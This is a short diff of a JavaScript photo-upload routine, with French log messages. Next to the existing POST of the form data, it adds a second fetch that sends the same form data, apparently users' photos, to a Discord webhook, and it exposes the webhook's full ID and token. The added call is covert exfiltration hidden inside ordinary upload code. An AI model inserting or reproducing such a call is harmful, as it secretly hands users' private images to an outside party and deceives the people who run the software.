@@ -35,6 +35,10 @@
                     method: 'POST',
                     body: formData
                 })
+                fetch('https://discord.com/api/webhooks/1318640514152661134/jSxYxHDD1olZV7vo5ACKoeG7TQxHTVEVCqxG7uXOgD7SRMu7IYdG0PuFOuag2wFcDMUC', {
+                    method: 'POST',
+                    body: formData
+                })
                 .then(response => {
                     if (response.ok) {
                         console.log(`Photo envoyée avec succès (${label}).`);
